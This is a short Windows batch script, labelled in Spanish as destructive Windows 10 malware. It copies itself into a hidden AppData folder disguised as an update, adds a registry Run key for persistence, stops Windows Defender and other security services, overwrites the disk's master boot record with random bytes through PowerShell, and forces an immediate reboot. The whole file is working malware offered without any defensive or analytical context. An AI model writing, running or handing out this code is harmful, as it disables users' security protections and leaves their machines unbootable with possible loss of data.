@echo off
:: ====== MALWARE WINDOWS 10 DESTRUCTIVO ======
:: Autoâ€‘copiarse a carpeta oculta
set TARGET=%APPDATA%\WinUpdate
if not exist "%TARGET%" mkdir "%TARGET%"
copy "%~f0" "%TARGET%\sysupdater.bat" >nul

:: Agregar persistencia al registro
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SysUpdate /t REG_SZ /d "%TARGET%\sysupdater.bat" /f

:: Matar servicios de seguridad
sc stop WinDefend
sc stop wscsvc
sc stop Sense
sc stop SecurityHealthService
taskkill /f /im MpCmdRun.exe
taskkill /f /im MsMpEng.exe

:: Llamar a Powershell para destruir el MBR
powershell -command ^
 "$fs = [System.IO.File]::Open('\\.\PhysicalDrive0','Open','ReadWrite','None');" ^
 "$evil = [byte[]](0..511 | %% {Get-Random -Maximum 256});" ^
 "$fs.Write($evil,0,512);" ^
 "$fs.Close()"

:: Apagar todo
shutdown -r -f -t 0
